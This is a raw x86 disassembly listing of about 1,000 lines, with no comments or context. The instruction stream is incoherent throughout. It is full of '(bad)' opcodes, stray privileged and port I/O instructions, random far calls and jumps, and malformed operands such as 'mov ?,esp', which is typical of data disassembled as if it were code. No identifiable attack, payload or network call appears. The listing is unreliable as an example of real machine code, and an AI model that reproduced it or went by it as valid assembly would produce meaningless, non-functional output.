  405e66:	push   ebp
  405e67:	call   0x4a6c:0x98d84c0b
  405e6e:	pushf  
  405e6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e70:	sub    DWORD PTR [edi],0x4b
  405e73:	lea    edx,[ebx-0x2c95f370]
  405e79:	aam    0x75
  405e7b:	cmp    eax,DWORD PTR [ebx+0x65d23c57]
  405e81:	(bad)  
  405e82:	adc    DWORD PTR ds:0x81bce9c9,eax
  405e88:	int3   
  405e89:	inc    ebx
  405e8a:	xlat   BYTE PTR ds:[ebx]
  405e8b:	or     eax,0xcb098437
  405e90:	fist   WORD PTR [edi]
  405e92:	rcl    DWORD PTR ds:[edi],0x1f
  405e96:	cdq    
  405e97:	shr    BYTE PTR ds:0x18911019,1
  405e9d:	pusha  
  405e9e:	add    al,al
  405ea0:	rcl    DWORD PTR [ebp-0x6],0x3d
  405ea4:	adc    eax,0x331a581e
  405ea9:	out    dx,al
  405eaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405eab:	pop    ebp
  405eac:	adc    DWORD PTR [edi-0x4c],esi
  405eaf:	gs mov dh,0x95
  405eb2:	or     dh,al
  405eb4:	(bad)  
  405eb5:	call   0x757fce8
  405eba:	shr    DWORD PTR [ebx-0x35685bb2],0xdb
  405ec1:	cmc    
  405ec2:	mov    ebp,DWORD PTR ss:[edx]
  405ec5:	lock push ebx
  405ec7:	dec    esp
  405ec8:	pop    es
  405ec9:	inc    esp
  405eca:	mov    ds:0x943c8adb,eax
  405ecf:	push   es
  405ed0:	jmp    0x405f2c
  405ed2:	push   esp
  405ed3:	push   0xffffff8c
  405ed5:	sub    bh,BYTE PTR [edi]
  405ed7:	repz dec edx
  405ed9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405eda:	pop    esp
  405edb:	ins    DWORD PTR es:[edi],dx
  405edc:	pop    es
  405edd:	and    ah,dl
  405edf:	mov    esp,esi
  405ee1:	cmp    al,0x17
  405ee3:	shr    DWORD PTR [edx],1
  405ee5:	test   BYTE PTR [ebp+0xca66596],cl
  405eeb:	mov    ecx,0xba9792f2
  405ef0:	cmp    eax,DWORD PTR [eax+ebx*4+0x1b9d829a]
  405ef7:	or     edx,DWORD PTR [ebp+0x18]
  405efa:	push   0x5f33d1a2
  405eff:	pop    eax
  405f00:	xchg   edx,eax
  405f01:	enter  0x16c2,0xd3
  405f05:	test   eax,0xfa889d9a
  405f0a:	shr    DWORD PTR [esi-0x48],cl
  405f0d:	hlt    
  405f0e:	jno    0x405ec3
  405f10:	pop    ecx
  405f11:	inc    edi
  405f12:	cli    
  405f13:	icebp  
  405f14:	fisubr DWORD PTR [edx+0x36692a13]
  405f1a:	mov    eax,0x3e23345a
  405f1f:	or     esp,edx
  405f21:	adc    DWORD PTR [esi+0x46],esi
  405f24:	retf   0xb679
  405f27:	ins    BYTE PTR es:[edi],dx
  405f28:	(bad)  
  405f29:	mov    eax,0x383077b6
  405f2e:	test   BYTE PTR [ebp+0x244e90f],bh
  405f34:	(bad)
  405f38:	fist   DWORD PTR [ecx]
  405f3a:	dec    ebx
  405f3b:	and    bl,BYTE PTR [ebx-0x6b158f86]
  405f41:	retf   0x73c2
  405f44:	stc    
  405f45:	bound  edx,QWORD PTR [ecx-0x6c]
  405f48:	add    ebx,edi
  405f4a:	lods   al,BYTE PTR ds:[esi]
  405f4b:	jnp    0x405f07
  405f4d:	jo     0x405ed6
  405f4f:	out    dx,eax
  405f50:	addr16 mov bh,0x44
  405f53:	pop    edi
  405f54:	mov    esi,0xde77311e
  405f59:	add    cl,dl
  405f5b:	mov    ds:0x801fdb09,eax
  405f60:	ds lahf 
  405f62:	mov    DWORD PTR [ecx],edi
  405f64:	inc    eax
  405f65:	jne    0x405f3d
  405f67:	jge    0x405f3e
  405f69:	lea    ecx,[ebp+0x75]
  405f6c:	adc    ecx,DWORD PTR [eax+eax*1+0x7976842e]
  405f73:	jno    0x405f3c
  405f75:	and    BYTE PTR [ebp-0x178075dc],dh
  405f7b:	mov    dl,0xbf
  405f7d:	pop    ebp
  405f7e:	push   esp
  405f7f:	rcl    BYTE PTR ds:0x2a2ceb0,0xcc
  405f86:	or     eax,0xc156b3ed
  405f8b:	ret    0xa8b
  405f8e:	js     0x405f91
  405f90:	enter  0xd020,0x3e
  405f94:	loopne 0x405fda
  405f96:	into   
  405f97:	aas    
  405f98:	cs sbb bl,ah
  405f9b:	or     al,0x79
  405f9d:	repnz or edi,DWORD PTR [ebp+0x6f]
  405fa1:	xor    DWORD PTR [ebx],edx
  405fa3:	shr    BYTE PTR [eax-0x60d86dd7],1
  405fa9:	ror    ecx,0x2c
  405fac:	mov    ecx,0x349938f4
  405fb1:	inc    ebx
  405fb2:	xchg   ebp,eax
  405fb3:	or     DWORD PTR [ebx+0x53],edi
  405fb6:	fs or  al,0xb9
  405fb9:	in     al,0x4f
  405fbb:	push   esi
  405fbc:	jmp    0x405feb
  405fbe:	inc    esi
  405fbf:	stos   BYTE PTR es:[edi],al
  405fc0:	mov    ds:0x6815993a,eax
  405fc5:	std    
  405fc6:	sub    BYTE PTR [ecx],ah
  405fc8:	sub    BYTE PTR [edi-0x1f],dh
  405fcb:	(bad)  
  405fcc:	xchg   ebx,eax
  405fcd:	adc    ecx,eax
  405fcf:	pop    ds
  405fd0:	inc    esi
  405fd1:	pop    es
  405fd2:	xchg   ebp,eax
  405fd3:	and    esi,esi
  405fd5:	loope  0x406012
  405fd7:	mov    DWORD PTR [edi-0x5],esi
  405fda:	jbe    0x405fd5
  405fdc:	jmp    0x405fd5
  405fde:	repz imul ebx,ecx,0xcd6ed8dc
  405fe5:	jb     0x405fb0
  405fe7:	adc    DWORD PTR [ecx],ecx
  405fe9:	rol    BYTE PTR [edx+0xbced732],0xab
  405ff0:	fiadd  DWORD PTR [ebx]
  405ff2:	pop    esi
  405ff3:	dec    eax
  405ff4:	mov    ah,0xd7
  405ff6:	rol    BYTE PTR [ecx+0x6c02f556],cl
  405ffc:	mov    ebx,0xe2681887
  406001:	jmp    0x406063
  406003:	push   DWORD PTR [edx]
  406005:	loope  0x40601d
  406007:	mov    esi,DWORD PTR [esi]
  406009:	push   0xdae56e77
  40600e:	dec    esi
  40600f:	or     al,0x45
  406011:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406012:	xor    ecx,ebx
  406014:	in     al,0x79
  406016:	sbb    DWORD PTR [edx],ebx
  406018:	dec    ebp
  406019:	mov    eax,ds:0x5bd60578
  40601e:	outs   dx,BYTE PTR ds:[si]
  406020:	xor    al,0xff
  406022:	and    ch,BYTE PTR [edx+eax*4]
  406025:	neg    BYTE PTR [ebp+0x14e67b7e]
  40602b:	mov    BYTE PTR ds:0xf07b3575,cl
  406031:	leave  
  406032:	jmp    0x406028
  406034:	mov    eax,0x984f1a0e
  406039:	stc    
  40603a:	fimul  DWORD PTR [ecx+0x5acdb1d4]
  406040:	les    edx,FWORD PTR [edx-0x7c]
  406043:	ret    
  406044:	loope  0x406073
  406046:	mov    edi,0x8291f420
  40604b:	ror    DWORD PTR [ecx],cl
  40604d:	cmp    al,0x9d
  40604f:	ins    BYTE PTR es:[edi],dx
  406050:	mov    eax,0xa9e54f09
  406055:	dec    ecx
  406056:	out    0xa7,eax
  406058:	or     DWORD PTR [edi-0xc],0xffffffa6
  40605c:	mov    ds:0x1335a1a6,eax
  406061:	jne    0x40602b
  406063:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406064:	sub    bh,cl
  406066:	and    eax,0x66977bc9
  40606b:	aam    0x6a
  40606d:	ficomp WORD PTR [ecx-0x38184830]
  406073:	push   cs
  406074:	xchg   esp,eax
  406075:	push   es
  406076:	fsub   DWORD PTR [eax+edx*2]
  406079:	cmp    esp,ebx
  40607b:	add    ch,dh
  40607d:	cmp    al,0x50
  40607f:	xchg   ecx,eax
  406080:	sbb    BYTE PTR [ecx-0x5938bc28],dh
  406086:	ins    DWORD PTR es:[edi],dx
  406087:	jnp    0x4060e3
  406089:	ss fwait
  40608b:	add    eax,0x9c407e93
  406090:	jnp    0x4060f8
  406092:	call   0x11de:0x35eb3cdb
  406099:	cli    
  40609a:	push   ebx
  40609b:	int    0xe4
  40609d:	ret    
  40609e:	adc    BYTE PTR [edi-0x779dd886],0x40
  4060a5:	jbe    0x406093
  4060a7:	xchg   edi,eax
  4060a8:	push   ss
  4060a9:	in     eax,0x6f
  4060ab:	je     0x406082
  4060ad:	pop    esi
  4060ae:	and    ebx,esp
  4060b0:	and    DWORD PTR [edi],esp
  4060b2:	mov    edx,0xd2f8fbf5
  4060b7:	(bad)  
  4060b9:	fst    DWORD PTR [ebp+ecx*1-0x5c]
  4060bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060be:	jl     0x40607f
  4060c0:	jmp    0x2ee8:0x37373e06
  4060c7:	sub    DWORD PTR [ebx-0x24],esi
  4060ca:	push   esp
  4060cb:	mov    ?,esp
  4060cd:	fist   DWORD PTR [edi]
  4060cf:	mov    ebx,0x3c34e782
  4060d4:	xor    ebx,DWORD PTR ds:0xb8c00ba1
  4060da:	xchg   ebp,eax
  4060db:	(bad)  
  4060dd:	ins    BYTE PTR es:[edi],dx
  4060de:	xor    bh,al
  4060e0:	fld    DWORD PTR [edx]
  4060e2:	shl    BYTE PTR [edi+edx*4],1
  4060e5:	cli    
  4060e6:	or     al,0x4e
  4060e8:	add    esp,esp
  4060ea:	xchg   ebx,eax
  4060eb:	add    BYTE PTR [ebx],al
  4060ed:	ss iret 
  4060ef:	int    0xd3
  4060f1:	jmp    0x39f:0x6fafd41c
  4060f8:	repnz mov ecx,DWORD PTR [eax+0x16]
  4060fc:	test   al,0x2c
  4060fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060ff:	cmp    eax,0xc3f4eca7
  406104:	sahf   
  406105:	ins    DWORD PTR es:[edi],dx
  406106:	jecxz  0x4060bb
  406108:	cdq    
  406109:	(bad)  
  40610b:	rcr    DWORD PTR [eax+0x23714b41],cl
  406111:	call   0x6fb7:0x7ab84015
  406118:	xchg   ebp,eax
  406119:	mov    BYTE PTR [eax+0x4d],bh
  40611c:	ficomp DWORD PTR [edx+0x15849619]
  406122:	jmp    0x406114
  406124:	add    al,0x2d
  406126:	imul   esp,DWORD PTR [ebx-0x34],0xef879902
  40612d:	pop    esi
  40612e:	lahf   
  40612f:	inc    edx
  406130:	inc    esi
  406131:	pop    ebp
  406132:	rol    BYTE PTR [eax-0x6],cl
  406135:	xor    al,0x88
  406137:	mov    ah,0x3b
  406139:	sti    
  40613a:	and    esp,DWORD PTR [ebx]
  40613c:	aas    
  40613d:	lock loopne 0x4061b6
  406140:	push   es
  406141:	out    dx,eax
  406142:	cmc    
  406143:	aaa    
  406144:	sub    bh,BYTE PTR cs:[ebx-0x2c3aed27]
  40614b:	lock mov ch,0x3c
  40614e:	out    0x2e,al
  406150:	push   cs
  406151:	sub    BYTE PTR [eax],al
  406153:	sub    ah,ch
  406155:	imul   esi,DWORD PTR [eax+0x54],0x6d
  406159:	cmc    
  40615a:	pop    ebp
  40615b:	rcr    DWORD PTR [eax-0x77],cl
  40615e:	js     0x4061b2
  406160:	push   ebp
  406161:	push   ecx
  406162:	and    eax,DWORD PTR [eax+0x2e]
  406165:	and    al,0x88
  406167:	dec    esi
  406168:	or     al,BYTE PTR [esi-0x4c]
  40616b:	in     al,0xbf
  40616d:	ss sub al,ah
  406170:	je     0x4060f7
  406172:	es retf 
  406174:	mov    ebx,0x17b5f40a
  406179:	daa    
  40617a:	daa    
  40617b:	xlat   BYTE PTR ds:[ebx]
  40617c:	mov    ebp,0xf859a191
  406181:	lock sub edi,DWORD PTR [esi-0x79acf37a]
  406188:	cmp    eax,0xed054fd3
  40618d:	ins    DWORD PTR es:[edi],dx
  40618e:	inc    esp
  40618f:	ffree  st(7)
  406191:	and    eax,ebp
  406193:	sub    edi,DWORD PTR [edi]
  406195:	mov    edx,0xa71d263f
  40619a:	mov    ds:0x902a7f0b,al
  40619f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061a0:	repz (bad) 
  4061a2:	std    
  4061a3:	jno    0x4061f8
  4061a5:	xor    al,0x61
  4061a7:	push   es
  4061a8:	rcr    BYTE PTR [edx],1
  4061aa:	stos   BYTE PTR es:[edi],al
  4061ab:	pop    ebx
  4061ac:	mov    cl,0x59
  4061ae:	std    
  4061af:	sub    ebp,DWORD PTR [ebx+eax*2+0x4d]
  4061b3:	pop    edx
  4061b4:	cmp    ah,BYTE PTR [ebx+eiz*2]
  4061b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061b8:	cs mov ecx,0x6c27d71a
  4061be:	leave  
  4061bf:	div    BYTE PTR [ebx+0x58ce07d9]
  4061c5:	pop    edi
  4061c6:	(bad)  
  4061c7:	hlt    
  4061c8:	cmp    al,0x26
  4061ca:	push   ebp
  4061cb:	ja     0x40622c
  4061cd:	fwait
  4061ce:	sbb    ch,cl
  4061d0:	sbb    BYTE PTR [edx],0x86
  4061d3:	xchg   ecx,eax
  4061d4:	push   edx
  4061d5:	daa    
  4061d6:	in     eax,dx
  4061d7:	xlat   BYTE PTR ds:[ebx]
  4061d8:	fnstcw WORD PTR [edx+0xe3ad67c]
  4061de:	popa   
  4061df:	call   0x5dbf23ef
  4061e4:	(bad)  
  4061e5:	xor    ah,BYTE PTR [edx-0x4493da33]
  4061eb:	pop    edi
  4061ec:	stc    
  4061ed:	ds mov bl,0x7c
  4061f0:	ins    DWORD PTR es:[edi],dx
  4061f1:	nop
  4061f2:	in     eax,0x26
  4061f4:	mov    ebx,0xf0fa01c0
  4061f9:	push   cs
  4061fa:	lods   eax,DWORD PTR ds:[esi]
  4061fb:	adc    eax,0xeaa9876e
  406200:	push   esi
  406201:	jo     0x406191
  406203:	mov    BYTE PTR [ebx-0x7d5e8057],bh
  406209:	pop    edx
  40620a:	push   ecx
  40620b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40620c:	sub    al,0x67
  40620e:	mov    bl,0x58
  406210:	(bad)  
  406211:	dec    ecx
  406212:	cmp    BYTE PTR [eax+0x312ca791],dh
  406218:	iret   
  406219:	ss or  al,0x24
  40621c:	gs std 
  40621e:	ss clc 
  406220:	call   0xa122:0xa955845a
  406227:	and    eax,0xf883f259
  40622c:	dec    esi
  40622d:	loopne 0x40628b
  40622f:	cli    
  406230:	popa   
  406231:	shr    BYTE PTR [ebx-0xa129725],cl
  406237:	push   edi
  406238:	test   al,bh
  40623a:	lahf   
  40623b:	jns    0x40625a
  40623d:	data16 lahf 
  40623f:	ins    BYTE PTR es:[edi],dx
  406240:	xor    eax,0x85e196b7
  406245:	hlt    
  406246:	push   ebp
  406247:	pop    esp
  406248:	push   ebp
  406249:	xor    al,0x12
  40624b:	cs pop ebp
  40624d:	jge    0x406243
  40624f:	jne    0x4062ba
  406251:	inc    ebp
  406252:	dec    esi
  406253:	add    BYTE PTR [edi],al
  406255:	std    
  406256:	je     0x4062c4
  406258:	sub    eax,DWORD PTR [eax]
  40625a:	iret   
  40625b:	cdq    
  40625c:	imul   BYTE PTR [ebx-0x487fb7a8]
  406262:	cmp    eax,ebp
  406264:	les    edx,FWORD PTR [edi-0xdc7f4be]
  40626a:	xor    eax,DWORD PTR [esi+0x59]
  40626d:	xor    al,0xd1
  40626f:	inc    ecx
  406270:	sub    DWORD PTR [edi+0x54157019],ebx
  406276:	pusha  
  406277:	xlat   BYTE PTR ds:[ebx]
  406278:	jno    0x4062eb
  40627a:	xor    BYTE PTR [esi],0x2c
  40627d:	fld    DWORD PTR [edi-0x46]
  406280:	cmp    eax,0xe9e3832b
  406285:	adc    al,0x50
  406287:	push   ds
  406288:	mov    esi,0xc5e2472b
  40628d:	dec    esi
  40628e:	in     eax,dx
  40628f:	push   0x9bac3787
  406294:	inc    esp
  406295:	(bad)  
  406296:	subps  xmm7,xmm4
  406299:	cmp    DWORD PTR [ecx],esi
  40629b:	fisub  DWORD PTR [ebp-0x6fd990ad]
  4062a1:	push   0x53
  4062a3:	push   edx
  4062a4:	ins    BYTE PTR es:[edi],dx
  4062a5:	xor    eax,0x3b7e4fbf
  4062aa:	mov    al,ds:0xda597622
  4062af:	dec    eax
  4062b0:	ror    dl,cl
  4062b2:	leave  
  4062b3:	adc    cl,BYTE PTR [edi]
  4062b5:	das    
  4062b6:	gs hlt 
  4062b8:	jae    0x4062bc
  4062ba:	pop    edi
  4062bb:	arpl   si,bx
  4062bd:	fdivp  st(7),st
  4062bf:	icebp  
  4062c0:	mov    bh,BYTE PTR [esp+ecx*8-0x51]
  4062c4:	mov    ah,BYTE PTR [ebx+0x7addef7]
  4062ca:	xchg   ebp,eax
  4062cb:	push   esp
  4062cc:	in     al,dx
  4062cd:	inc    edi
  4062ce:	push   es
  4062cf:	pop    edx
  4062d0:	inc    edi
  4062d1:	not    dl
  4062d3:	fxch   st(1)
  4062d5:	into   
  4062d6:	sbb    ebx,DWORD PTR [eax-0x5a]
  4062d9:	xor    al,0xe9
  4062db:	mov    ebx,0x9bee4cab
  4062e0:	hlt    
  4062e1:	daa    
  4062e2:	stos   DWORD PTR es:[edi],eax
  4062e3:	push   ebx
  4062e4:	loop   0x4062e4
  4062e6:	sahf   
  4062e7:	xor    eax,0xd8189c32
  4062ec:	stc    
  4062ed:	pop    edi
  4062ee:	or     BYTE PTR [ecx+0x262298b8],ch
  4062f4:	mov    bh,0x30
  4062f6:	mov    ?,esp
  4062f8:	add    BYTE PTR [edx-0x38362e49],0xa2
  4062ff:	mov    eax,0x2bb6ab70
  406304:	mov    eax,ds:0x2690054a
  406309:	icebp  
  40630a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40630b:	cmp    edx,DWORD PTR [ebx+0x11]
  40630e:	jg     0x4062cb
  406310:	lods   al,BYTE PTR ds:[esi]
  406311:	pushf  
  406312:	push   ss
  406313:	dec    eax
  406314:	push   edi
  406315:	hlt    
  406316:	add    BYTE PTR [eax+0x24],0x84
  40631a:	xor    al,0xc2
  40631c:	push   ds
  40631d:	sbb    ch,BYTE PTR [ebp-0x2a93fab0]
  406323:	mov    ds:0x1b07b368,eax
  406328:	mov    esi,0x4032c143
  40632d:	xor    ebp,DWORD PTR [edx-0x103cf31e]
  406333:	inc    esp
  406334:	jl     0x40634a
  406336:	dec    edi
  406337:	cmp    eax,0xe8d485a2
  40633c:	push   ebp
  40633d:	and    edi,eax
  40633f:	or     DWORD PTR [ebp+0x3fe9685f],ebx
  406345:	push   ecx
  406346:	(bad)  
  406347:	cmp    DWORD PTR [esi],edi
  406349:	xchg   edx,eax
  40634a:	push   eax
  40634b:	sbb    al,0xf1
  40634d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40634e:	fwait
  40634f:	cmp    ecx,0xffffffce
  406352:	adc    ch,BYTE PTR [edi]
  406354:	sbb    bh,BYTE PTR [eax+esi*1+0x57]
  406358:	cmp    al,0xc5
  40635a:	xor    eax,0xe877de5c
  40635f:	cmp    edi,ecx
  406361:	mov    ds:0xc2c36e51,al
  406366:	leave  
  406367:	or     dl,BYTE PTR [edx-0x2f]
  40636a:	test   al,0xff
  40636c:	sub    dl,BYTE PTR [edi-0x54]
  40636f:	in     eax,dx
  406370:	push   ss
  406371:	loope  0x40631c
  406373:	or     al,BYTE PTR [ebx+0x22]
  406376:	sahf   
  406377:	lods   eax,DWORD PTR ds:[esi]
  406378:	lock and eax,0x4c03c4e6
  40637e:	mov    DWORD PTR [edi+0x6b],edi
  406381:	push   edi
  406382:	lahf   
  406383:	mov    WORD PTR [edi*8-0x32a75e35],fs
  40638a:	sbb    dl,BYTE PTR [ecx]
  40638c:	adc    al,0xfd
  40638f:	or     eax,0x68ab8c60
  406394:	or     bl,bl
  406396:	push   edi
  406397:	mov    edi,0x7e6faa8f
  40639c:	(bad)
  40639f:	gs test eax,0xab58f6ca
  4063a6:	retf   0xa690
  4063a9:	xor    cl,BYTE PTR [ebx+0x43d419a1]
  4063af:	push   edx
  4063b0:	aad    0x30
  4063b2:	cmp    DWORD PTR [eax],0x8558a646
  4063b8:	fdiv   QWORD PTR [edi+eiz*1]
  4063bb:	push   esp
  4063bc:	es mov al,0x9
  4063bf:	mov    bh,0xb7
  4063c1:	fwait
  4063c2:	mov    ebx,0xd7cfe581
  4063c7:	push   0x15f20249
  4063cc:	jecxz  0x4063ce
  4063ce:	or     dh,BYTE PTR [ebx]
  4063d0:	jno    0x4063fa
  4063d2:	sub    al,0xaf
  4063d4:	cli    
  4063d5:	ja     0x406365
  4063d7:	daa    
  4063d8:	daa    
  4063d9:	inc    esi
  4063da:	inc    eax
  4063db:	and    eax,0xf8d19dcb
  4063e0:	retf   
  4063e1:	xor    eax,0x610651ee
  4063e6:	(bad)  
  4063e7:	push   edx
  4063e8:	dec    eax
  4063e9:	aaa    
  4063ea:	iret   
  4063eb:	retf   
  4063ec:	rol    DWORD PTR [ebp-0x1d6968c7],0x8f
  4063f3:	je     0x406474
  4063f5:	pop    es
  4063f6:	ror    BYTE PTR [ecx+0xda50cd9],0x38
  4063fd:	stos   DWORD PTR es:[edi],eax
  4063fe:	es mov al,0x2a
  406401:	test   dh,al
  406403:	outs   dx,BYTE PTR ds:[esi]
  406404:	int3   
  406405:	rol    BYTE PTR ds:[ecx-0x16],0xd4
  40640a:	inc    edi
  40640b:	in     eax,dx
  40640c:	or     eax,0xe3aa84fe
  406411:	pop    esp
  406412:	(bad)  
  406413:	mov    al,0xac
  406415:	push   0xfffffffe
  406417:	dec    esp
  406418:	jl     0x40647e
  40641a:	out    0xba,al
  40641c:	int    0x22
  40641e:	in     al,dx
  40641f:	add    BYTE PTR [ebp-0x32f72104],0xeb
  406426:	fidivr DWORD PTR [eax-0x6312de00]
  40642c:	ds jmp 0x40647e
  40642f:	shr    esi,0x4c
  406432:	sbb    DWORD PTR [eax+0x6f],ecx
  406435:	(bad)  
  406437:	jno    0x40642a
  406439:	sub    ebx,DWORD PTR [edx]
  40643b:	enter  0xda62,0x95
  40643f:	enter  0xf339,0xe
  406443:	das    
  406444:	mov    ebp,0xefd8385f
  406449:	mov    DWORD PTR [esi],ebx
  40644b:	and    esp,eax
  40644d:	and    eax,0xbb93aa3b
  406452:	pop    ebp
  406453:	sbb    BYTE PTR [ebp+0x8],bl
  406456:	sbb    eax,0x89c760a5
  40645b:	adc    al,0x78
  40645d:	xchg   edx,eax
  40645e:	cmp    eax,0x63058a40
  406463:	mov    esp,0x7d63a4ab
  406468:	mov    cl,0xbe
  40646a:	pop    edi
  40646b:	mov    eax,ds:0x99b3e1c2
  406470:	pop    eax
  406471:	push   edx
  406472:	mov    WORD PTR [eax-0x14],es
  406475:	das    
  406476:	loopne 0x4064d5
  406478:	fisubr DWORD PTR fs:[edi+0x7a]
  40647c:	pop    es
  40647d:	sahf   
  40647e:	enter  0x3282,0x40
  406482:	test   al,0xe5
  406484:	popa   
  406485:	pop    ebx
  406486:	outs   dx,BYTE PTR ds:[esi]
  406487:	jmp    0x7468:0x1839fb51
  40648e:	and    ebp,DWORD PTR [edx]
  406490:	mov    BYTE PTR [esi],0xb6
  406493:	xor    al,0x3e
  406495:	dec    ebx
  406496:	mov    ds:0x307ccea9,eax
  40649b:	push   esi
  40649c:	cmc    
  40649d:	clc    
  40649e:	jg     0x40645f
  4064a0:	lods   al,BYTE PTR ds:[esi]
  4064a1:	inc    ecx
  4064a2:	ja     0x40651a
  4064a4:	adc    al,cl
  4064a6:	adc    DWORD PTR [eax-0x1bb88df4],0x51b09f42
  4064b0:	idiv   ecx
  4064b2:	inc    eax
  4064b3:	in     al,0x43
  4064b5:	pop    esi
  4064b6:	jb     0x406480
  4064b8:	mov    bl,ch
  4064ba:	xor    eax,0x5c1cf6ba
  4064bf:	imul   edx,DWORD PTR [ebx+0x65],0x87a7dbc2
  4064c6:	popa   
  4064c7:	push   edx
  4064c8:	cmc    
  4064c9:	xchg   edi,eax
  4064ca:	repz mov cl,0x9f
  4064cd:	jp     0x4064e3
  4064cf:	xor    ch,BYTE PTR [esi-0x41]
  4064d2:	lods   al,BYTE PTR ds:[esi]
  4064d3:	loope  0x40647c
  4064d5:	in     al,dx
  4064d6:	stc    
  4064d7:	call   0x4c18:0x126c3787
  4064de:	retf   0x5304
  4064e1:	xchg   ebp,eax
  4064e2:	mov    edi,DWORD PTR [edx]
  4064e4:	xor    esp,ebx
  4064e6:	push   ecx
  4064e7:	scas   al,BYTE PTR es:[edi]
  4064e8:	pop    esi
  4064e9:	dec    ecx
  4064ea:	jbe    0x406566
  4064ec:	out    dx,al
  4064ed:	scas   eax,DWORD PTR es:[edi]
  4064ee:	adc    BYTE PTR [esi+0x5e],dh
  4064f1:	xchg   ecx,eax
  4064f2:	mov    eax,ds:0x425faa74
  4064f7:	mov    bh,0xa0
  4064f9:	lock mov eax,ds:0x9c6dfcf6
  4064ff:	mov    al,ds:0x29377a8b
  406504:	or     eax,0x11813528
  406509:	(bad)  
  40650a:	ins    BYTE PTR es:[edi],dx
  40650b:	jmp    0xde50d85f
  406510:	sti    
  406511:	ret    0x7fee
  406514:	aad    0x50
  406516:	(bad)  
  406517:	lock pop ebx
  406519:	mov    BYTE PTR [ebx+0x7b246343],cl
  40651f:	jne    0x4064bb
  406521:	lock xchg BYTE PTR [ebx],al
  406524:	or     dl,dl
  406526:	pushf  
  406527:	jmp    0x406569
  406529:	mov    dh,0xab
  40652b:	push   esp
  40652c:	loop   0x40655e
  40652e:	(bad)
  406531:	out    0xe3,eax
  406533:	inc    esp
  406534:	icebp  
  406535:	sub    eax,0x48fce0bc
  40653a:	sar    BYTE PTR [ebp+0x41],1
  40653d:	jl     0x406502
  40653f:	adc    ecx,ebx
  406541:	jl     0x4065b0
  406543:	sbb    al,BYTE PTR [eax*2+0x48feb7c1]
  40654a:	lods   al,BYTE PTR ds:[esi]
  40654b:	stos   BYTE PTR es:[edi],al
  40654c:	mov    ecx,0x296c5553
  406551:	push   0x6d47026b
  406556:	cld    
  406557:	dec    esi
  406558:	push   ds
  406559:	jl     0x406550
  40655b:	add    al,0xe7
  40655d:	cs fsubp st(0),st
  406560:	ss sub al,0x6e
  406563:	pop    ecx
  406564:	push   es
  406565:	or     al,0x5a
  406567:	test   BYTE PTR [ebx-0x69],dl
  40656a:	iret   
  40656b:	lods   eax,DWORD PTR ds:[esi]
  40656c:	xor    dl,ah
  40656e:	test   DWORD PTR [esi-0x5a4aa212],0xed05bd8
  406578:	jle    0x4065bd
  40657a:	test   eax,0xb426f746
  40657f:	mov    ds,WORD PTR [eax+0x140cfe0c]
  406585:	mov    bh,0x64
  406587:	(bad)  
  406589:	inc    edi
  40658a:	pop    edx
  40658b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40658c:	std    
  40658d:	fstp   DWORD PTR ds:0x80e5d805
  406593:	jle    0x28d098
  406599:	jno    0x406577
  40659b:	sub    BYTE PTR cs:0x6ec29b72,bl
  4065a2:	stos   DWORD PTR es:[edi],eax
  4065a3:	hlt    
  4065a4:	sbb    DWORD PTR [ebx+0x51],edi
  4065a7:	adc    cl,bh
  4065a9:	shr    DWORD PTR [edx],0x4f
  4065ac:	and    ah,BYTE PTR [edi+0x75805b46]
  4065b2:	adc    eax,0x578e72b
  4065b7:	mov    ah,0x14
  4065b9:	fiadd  DWORD PTR [edi]
  4065bb:	inc    ecx
  4065bc:	mov    edx,0x6d7f8f17
  4065c1:	add    eax,0xeb8c0f8e
  4065c6:	(bad)  
  4065c7:	adc    esp,ebp
  4065c9:	sahf   
  4065ca:	mov    al,0x38
  4065cc:	js     0x40664b
  4065ce:	es addr16 cmp bh,bl
  4065d2:	xlat   BYTE PTR ds:[ebx]
  4065d3:	in     al,0xfb
  4065d5:	push   edi
  4065d6:	mov    esp,0x7923408e
  4065db:	imul   esp,edx,0xda0b2ced
  4065e1:	lods   al,BYTE PTR ds:[esi]
  4065e2:	xor    BYTE PTR [esi],0xbe
  4065e5:	push   eax
  4065e6:	dec    edx
  4065e7:	and    BYTE PTR [edx-0x41f6bf16],cl
  4065ed:	dec    eax
  4065ee:	imul   si,WORD PTR [ebx+eax*1-0x6d],0xeca6
  4065f5:	dec    eax
  4065f6:	adc    eax,0xe00f0a76
  4065fb:	aas    
  4065fc:	inc    edi
  4065fd:	std    
  4065fe:	gs scas al,BYTE PTR es:[edi]
  406600:	mov    edi,0xb2a499ca
  406605:	mov    edi,0xcc8db9ed
  40660a:	jbe    0x406683
  40660c:	lahf   
  40660d:	call   0x2a11a1c8
  406612:	jl     0x40667c
  406614:	imul   esp,edx,0xc697512a
  40661a:	les    ebp,FWORD PTR [ebx+edx*4]
  40661d:	push   edx
  40661e:	nop
  40661f:	sub    esi,esi
  406621:	pop    ds
  406622:	pop    eax
  406623:	aas    
  406624:	js     0x4065ff
  406626:	pop    edi
  406627:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406628:	xchg   esi,eax
  406629:	loop   0x4065d3
  40662b:	sahf   
  40662c:	push   edi
  40662d:	jp     0x406656
  40662f:	in     al,0x29
  406631:	and    edi,DWORD PTR [ebp+0x1fc292f2]
  406637:	jmp    0x3608f567
  40663c:	ins    DWORD PTR es:[edi],dx
  40663d:	int    0x77
  40663f:	stc    
  406640:	add    edx,DWORD PTR [ebp-0x2e94d24d]
  406646:	mov    dl,0x59
  406648:	stos   DWORD PTR es:[edi],eax
  406649:	dec    ecx
  40664a:	or     BYTE PTR [esi+0x45],al
  40664d:	dec    edi
  40664e:	repz jno 0x4065d9
  406651:	fisttp WORD PTR ss:[edi-0x80]
  406655:	das    
  406656:	pop    esp
  406657:	jbe    0x406662
  406659:	push   ds
